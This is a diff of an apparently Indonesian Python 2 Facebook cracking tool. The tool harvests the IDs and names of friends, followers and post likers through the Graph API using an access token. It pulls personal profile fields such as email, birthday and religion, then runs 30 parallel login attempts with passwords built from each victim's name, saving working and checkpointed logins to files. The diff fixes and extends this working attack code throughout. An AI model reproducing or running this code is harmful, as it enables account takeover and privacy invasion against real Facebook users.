@@ -1,7 +1,7 @@
 #!/usr/bin/python2
 # coding=utf-8
-# code by Yayan XD
-# my facebook ( https://www.facebook.com/KM39453 )
+# Coded By Yayan XD
+# My Facebook ( https://www.facebook.com/KM39453 )
 
 #      (C) Copyright 407 Authentic Exploit
 #      Rebuild Copyright Can't make u real programmer:)
@@ -61,10 +61,9 @@ my_color = [
 warna = random.choice(my_color)
 #  Moch Yayan Juan Alvredo XD.  #
 #------------------------------->
-
-ok, cp, id, loop = [], [], [], 0
-xi_jimpinx = '1714000985456399'
 koh = '100005395413800'
+xi_jimpinx = '1714000985456399'
+ok, cp, id, loop = [], [], [], 0
 hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
@@ -232,16 +231,16 @@ def teman(kontol):
         mmk = raw_input('\n %s[%s?%s] nama file  : '%(N,O,N))
         asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
         cin = ('dump/' + mmk + '.json').replace(' ', '_')
-        ys  = open(cin, 'w')
+        xxx = open(cin, 'w')
         for a in requests.get('https://graph.facebook.com/me/friends?limit=%s&access_token=%s'%(asw,kontol)).json()["data"]:
-            id.append(a['id'] + '<=>' + a['name'])
-            ys.write(a['id'] + '<=>' + a['name'] + '\n')
+            id.append(a['name'] + '<=>' + a['id'])
+            xxx.write(a['name'] + '<=>' + a['id'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
             sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
             )); sys.stdout.flush()
             time.sleep(0.0050)
 
-        ys.close()
+        xxx.close()
         jalan('\n\n %s[%s✓%s] berhasil dump id dari teman'%(N,H,N))
         print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,cin,N)
         print 50 * '-'
@@ -264,16 +263,16 @@ def publik(kontol):
         ahh = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
         ihh = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
         knt = ('dump/' + ahh + '.json').replace(' ', '_')
-        ys  = open(knt, 'w')
+        xxx = open(knt, 'w')
         for a in requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(csy,ihh,kontol)).json()["data"]:
-            id.append(a['id'] + '<=>' + a['name'])
-            ys.write(a['id'] + '<=>' + a['name'] + '\n')
+            id.append(a['name'] + '<=>' + a['id'])
+            xxx.write(a['name'] + '<=>' + a['id'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
             sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
             )); sys.stdout.flush()
             time.sleep(0.0050)
 
-        ys.close()
+        xxx.close()
         jalan('\n\n %s[%s✓%s] berhasil dump id dari teman publik'%(N,H,N))
         print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,knt,N)
         print 50 * '-'
@@ -293,16 +292,16 @@ def followers(kontol):
         mmk = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
         asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
         ah  = ('dump/' + mmk + '.json').replace(' ', '_')
-        ys  = open(ah, 'w')
+        xxx = open(ah, 'w')
         for a in requests.get('https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s'%(csy,asw,kontol)).json()["data"]:
             id.append(a['id'] + '<=>' + a['name'])
-            ys.write(a['id'] + '<=>' + a['name'] + '\n')
+            xxx.write(a['id'] + '<=>' + a['name'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
             sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
             )); sys.stdout.flush()
             time.sleep(0.0050)
 
-        ys.close()
+        xxx.close()
         jalan('\n\n %s[%s✓%s] berhasil dump id dari total followers'%(N,H,N))
         print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ah,N)
         print 50 * '-'
@@ -322,16 +321,16 @@ def postingan(kontol):
         ppk = raw_input(' %s[%s?%s] nama file  : '%(N,O,N))
         asw = raw_input(' %s[%s?%s] limit id   : '%(N,O,N))
         ahh = ('dump/' + ppk + '.json').replace(' ', '_')
-        ys  = open(ahh, 'w')
+        xxx = open(ahh, 'w')
         for a in requests.get('https://graph.facebook.com/%s/likes?limit=%s&access_token=%s'%(csy,asw,kontol)).json()["data"]:
             id.append(a['id'] + '<=>' + a['name'])
-            ys.write(a['id'] + '<=>' + a['name'] + '\n')
+            xxx.write(a['id'] + '<=>' + a['name'] + '\n')
             w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
             sys.stdout.write('\r\033[0m - ' + w + '%s%s                                        \r\n\n [\033[0;96m%s\033[0m] [\033[0;91m%s\033[0m] Proses Dump Id...'%(a['name'],N,datetime.now().strftime('%H:%M:%S'), len(id)
             )); sys.stdout.flush()
             time.sleep(0.0050)
 
-        ys.close()
+        xxx.close()
         jalan('\n\n %s[%s✓%s] berhasil dump id dari like postingan'%(N,H,N))
         print ' [%s•%s] salin output file 👉 ( %s%s%s )'%(O,N,M,ahh,N)
         print 50 * '-'
@@ -340,8 +339,7 @@ def postingan(kontol):
         os.remove(ahh)
         jalan('\n %s[%s!%s] Gagal dump id, kemungkinan id tidaklah publik.\n'%(N,M,N))
         raw_input(' [ %sKEMBALI%s ] '%(O,N));moch_yayan()
-
-# cek ingfo
+#cek ingfo
 def cek_ingfo(kontol):
     try:
         user = raw_input("\n [%s+%s] masukan id atau username : "%(O,N))
@@ -358,7 +356,7 @@ def cek_ingfo(kontol):
         idt = email_.text
         if user == "me":
             idt = "me"
-        x = requests.get('https://graph.facebook.com/%s?access_token=%s'%(idt, kontol)).json()
+        x = requests.get('https://graph.facebook.com/%s?fields=name,id,birthday,first_name,middle_name,last_name,name_format,picture,short_name,gender,link,email,location,hometown,religion,relationship_status,significant_other,about,locale&access_token=%s'%(idt, kontol)).json()
         nmaa = x['name']
     except (KeyError, IOError):
         nmaa = '%s-%s'%(M,N)
@@ -563,7 +561,7 @@ class __crack__:
                             with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
-                                        kimochi = ikeh.split('<=>')[0]
+                                        kimochi = ikeh.split('<=>')[1]
                                         __yayanXD__.submit(self.__api__, kimochi, ysc)
                                     except: pass
 
@@ -576,7 +574,7 @@ class __crack__:
                             with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
-                                        kimochi = ikeh.split('<=>')[0]
+                                        kimochi = ikeh.split('<=>')[1]
                                         __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                     except: pass
 
@@ -589,7 +587,7 @@ class __crack__:
                             with YayanGanteng(max_workers=30) as (__yayanXD__):
                                 for ikeh in self.id:
                                     try:
-                                        kimochi = ikeh.split('<=>')[0]
+                                        kimochi = ikeh.split('<=>')[1]
                                         __yayanXD__.submit(self.__mfb,__, kimochi, ysc)
                                     except: pass
 
@@ -640,7 +638,6 @@ class __crack__:
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
-                continue
             elif 'www.facebook.com' in response.json()['error_msg']:
                 try:
                     kontol = open('.memek.txt').read()
@@ -664,10 +661,10 @@ class __crack__:
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
+            else:
                 continue
 
         loop += 1
-
     def __mbasic__(self, user, __yan__):
         global ok,cp,loop
         sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
@@ -691,7 +688,6 @@ class __crack__:
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
-                continue
             elif "checkpoint" in ses.cookies.get_dict().keys():
                 try:
                     kontol = open('.memek.txt').read()
@@ -715,10 +711,10 @@ class __crack__:
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
+            else:
                 continue
 
         loop += 1
-
     def __mfb__(self, user, __yan__):
         global ok,cp,loop
         sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
@@ -742,7 +738,6 @@ class __crack__:
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
-                continue
             elif "checkpoint" in ses.cookies.get_dict().keys():
                 try:
                     kontol = open('.memek.txt').read()
@@ -766,10 +761,9 @@ class __crack__:
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                 break
+            else:
                 continue
-
         loop += 1
-
     def __pler__(self):
         yan = raw_input('\n [*] method : ')
         if yan == '':
@@ -781,7 +775,7 @@ class __crack__:
             with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
-                        uid, name = yntkts.split('<=>')
+                        name, uid = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                             pwx = [name, xz[0]+"123", xz[0]+"12345"]
@@ -800,7 +794,7 @@ class __crack__:
             with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
-                        uid, name = yntkts.split('<=>')
+                        name, uid = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                             pwx = [name, xz[0]+"123", xz[0]+"12345"]
@@ -819,7 +813,7 @@ class __crack__:
             with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
-                        uid, name = yntkts.split('<=>')
+                        name, uid = yntkts.split('<=>')
                         xz = name.split(' ')
                         if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                             pwx = [name, xz[0]+"123", xz[0]+"12345"]
